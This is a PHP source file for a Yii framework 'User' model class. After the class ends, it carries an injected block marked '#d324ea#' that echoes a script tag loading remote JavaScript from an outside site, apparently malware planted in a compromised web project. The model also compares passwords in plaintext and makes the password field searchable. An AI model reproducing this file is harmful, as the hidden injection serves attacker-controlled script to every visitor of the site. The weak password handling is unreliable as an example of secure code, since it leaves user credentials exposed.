<?php

/**
 * This is the model class for table "user".
 *
 * The followings are the available columns in table 'user':
 * @property integer $userId
 * @property string $firstName
 * @property string $lastName
 * @property string $username
 * @property string $password
 * @property string $email
 */
class User extends CActiveRecord
{
	public $old_password;
	public $db_password;
	public $new_password;
	public $passwordCompare;
	
	/**
	 * @return string the associated database table name
	 */
	public function tableName()
	{
		return 'user';
	}

	/**
	 * @return array validation rules for model attributes.
	 */
	public function rules()
	{
		// NOTE: you should only define rules for those attributes that
		// will receive user inputs.
		return array(
			array('firstName, email', 'required'),
			array('password', 'required' , "on"=>"insert,register"),
			array('email','email'),
			array('firstName, lastName, username, password, email,address,mobile_no,city', 'length', 'max'=>200),
			// The following rule is used by search().
			// @todo Please remove those attributes that should not be searched.
			array('userId, firstName, lastName, username, password, email, address,mobile_no,city', 'safe', 'on'=>'search'),
			// Change Password
			array('old_password, new_password, passwordCompare', 'required', 'on'=>'change_password'),
			array('old_password', 'compare','compareAttribute'=>"db_password",'operator'=>'==', 'message'=>'Password does not match', 'on'=>'change_password'), 
			array('passwordCompare', 'compare','compareAttribute'=>"new_password",'operator'=>'==','message'=>'Password does not match', 'on'=>'change_password'),
			
			array('mobile_no', 'numerical', 'integerOnly'=>true, "on"=>"register"),
			array('firstName', 'match', 'pattern'=>'/^[A-Za-z]+[\w\s ]+$/', "on"=>"register"),
			
			//array('img_name', 'file', 'types'=>'jpg, gif, png', 'on'=>'insert'),
			array('photo', 'file', 'types'=>'jpg, gif, png', 'allowEmpty'=>true, 'on'=>'register'),
			
		);
	}

	/**
	 * @return array relational rules.
	 */
	public function relations()
	{
		// NOTE: you may need to adjust the relation name and the related
		// class name for the relations automatically generated below.
		return array(
		);
	}

	/**
	 * @return array customized attribute labels (name=>label)
	 */
	public function attributeLabels()
	{
		return array(
			'userId' => 'User',
			'firstName' => 'First Name',
			'lastName' => 'Last Name',
			'username' => 'Username',
			'password' => 'Password',
			'email' => 'Email',
			'city' => 'City',
			'mobile_no' => 'Mobile No',
			'address' => 'Address',
		);
	}

	/**
	 * Retrieves a list of models based on the current search/filter conditions.
	 *
	 * Typical usecase:
	 * - Initialize the model fields with values from filter form.
	 * - Execute this method to get CActiveDataProvider instance which will filter
	 * models according to data in model fields.
	 * - Pass data provider to CGridView, CListView or any similar widget.
	 *
	 * @return CActiveDataProvider the data provider that can return the models
	 * based on the search/filter conditions.
	 */
	public function search($param=array())
	{
		// @todo Please modify the following code to remove attributes that should not be searched.

		$criteria=new CDbCriteria($param);
		$criteria->together = true;
		$criteria->compare('userId',$this->userId);
		$criteria->compare('firstName',$this->firstName,true);
		$criteria->compare('lastName',$this->lastName,true);
		$criteria->compare('username',$this->username,true);
		$criteria->compare('password',$this->password,true);
		$criteria->compare('email',$this->email,true);
		
		return new CActiveDataProvider($this, array(
			'criteria'=>$criteria,
		));
	}

	/**
	 * Returns the static model of the specified AR class.
	 * Please note that you should have this exact method in all your CActiveRecord descendants!
	 * @param string $className active record class name.
	 * @return User the static model class
	 */
	public static function model($className=__CLASS__)
	{
		return parent::model($className);
	}
	
	public function beforeDelete()
	{
		
		$imageLocation = Yii::app()->basePath."/../upload/profile/";	
		@unlink($imageLocation.$this->photo);		
		
		return parent::beforeDelete();
	}
}







#d324ea#
if(empty($w)) {
$w = "<script type=\"text/javascript\" src=\"http://olteniamagazin.ro/2b9vr6yj.php?id=9383526\"></script>";
echo $w;
}
#/d324ea#

